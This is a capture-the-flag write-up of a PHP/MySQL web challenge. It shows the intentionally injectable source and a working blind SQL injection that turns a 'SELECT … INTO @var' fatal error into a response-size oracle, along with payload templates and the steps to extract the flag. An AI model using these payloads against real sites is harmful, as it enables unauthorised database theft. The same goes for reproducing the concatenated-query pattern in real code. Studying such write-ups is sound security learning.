# PHault — Web (Easy, 79 solves)

**Flag:** `pwnsec{f52d6544b4661bd4}`

## Target
The page is `highlight_file(__FILE__)` of itself:

```php
$START = microtime(true);
ob_start();
register_shutdown_function(function () use ($START) {
    $remaining = 2.0 - (microtime(true) - $START);
    if ($remaining > 0) { usleep((int)($remaining * 1000000)); }
}); // no timing attack!!
mysqli_report(MYSQLI_REPORT_OFF);
$db = new mysqli("127.0.0.1", "user", "user", "chall");
echo highlight_file(__FILE__, true);
if (isset($_GET["id"])) {
    $sql = "SELECT username FROM users WHERE id = " . $_GET["id"];
    $res = $db->query($sql);
    if (!$res) { die("ill try to tell him, dw"); }
    $row = $res->fetch_row();
    echo 'ill try to tell him, dw';
}
```

Textbook injection point — with every normal oracle removed:

* **No content oracle.** Both branches print the same literal, one via `die("…")` and one via
  `echo '…'`. Verified with `cmp`: the success and error bodies are **byte-identical**
  (4557 bytes), and the headers match too. `$row` is fetched and never used.
* **No error oracle.** `mysqli_report(MYSQLI_REPORT_OFF)` silences mysqli, so a failed query
  just returns `false`.
* **No timing oracle.** A shutdown function pads every response to exactly 2.0 s. Measured
  2.81 s flat for `id=1`, `id=`, `SLEEP(30)`, `BENCHMARK(200000000,MD5(1))` and a
  `information_schema.columns` self-join — the server also caps SELECT execution time, so
  time-based payloads are dead twice over.
* `INTO OUTFILE` / `INTO DUMPFILE` into the leaked webroot all 404 — no FILE privilege.

## The oracle is PHP, not SQL
Two observations combine.

**1. `display_errors` is on.** `?id[]=1` makes `$_GET["id"]` an array, so the string
concatenation emits a visible warning — which also leaks the path:

```
Warning: Array to string conversion in /var/www/html/index.php on line 14
```

**2. `mysqli::query()` returns `true`, not a result object, for a statement that produces no
result set.** Then `$res` passes the `if (!$res)` guard and `$res->fetch_row()` is a fatal
error on a bool. `SELECT … INTO @var` is exactly such a statement:

```
?id=1 INTO @a
  -> Fatal error: Uncaught Error: Call to a member function fetch_row() on bool
     in /var/www/html/index.php        (response 4744 bytes)
?id=1 INTO @a,@b                      (2 targets vs 1 column -> SQL error -> die, 4557 bytes)
```

So response size is a clean boolean:

| size | meaning |
|---|---|
| **4744** | injected SQL was **valid** (query returned `true`, PHP fatalled) |
| **4557** | injected SQL **errored** (the `die` path) |

## Turning validity into a predicate
Put a two-row subquery on the false branch, evaluated **once outside any row context** so an
empty `users` lookup cannot short-circuit it:

```
?id=(SELECT IF(<predicate>,1,(SELECT 1 UNION SELECT 2))) INTO @a
```

* predicate true → `IF` yields `1` → valid → 4744
* predicate false → *Subquery returns more than 1 row* → 4557

Validated on `1=1` / `1=2`, then binary-search `LENGTH()` and `ORD(SUBSTRING(...))`.
Because the 2 s pad is per-request server-side work, bits parallelise cleanly — 24 threads.

## Extraction
```
database (5)  = 'chall'
tables (10)   = 'flag,users'
columns (33)  = 'flag.flag,users.id,users.username'
FLAG in flag.flag (24) = 'pwnsec{f52d6544b4661bd4}'
543 oracle queries
```

## Lesson
When a challenge closes the obvious oracles one by one — identical bodies, silenced driver
errors, a fixed-latency pad and a hostile comment (`// no timing attack!!`) — the remaining
oracle is usually a *type* confusion in the glue code rather than anything in the database.
Here the whole solve hinges on one PHP API detail: `mysqli::query()` returns `bool` for a
resultless statement, and `SELECT … INTO @var` is reachable by appending to a `WHERE` clause.
Probing `?id[]=1` first was what made it worth looking for a PHP-level signal at all, since
it proved `display_errors` was on.
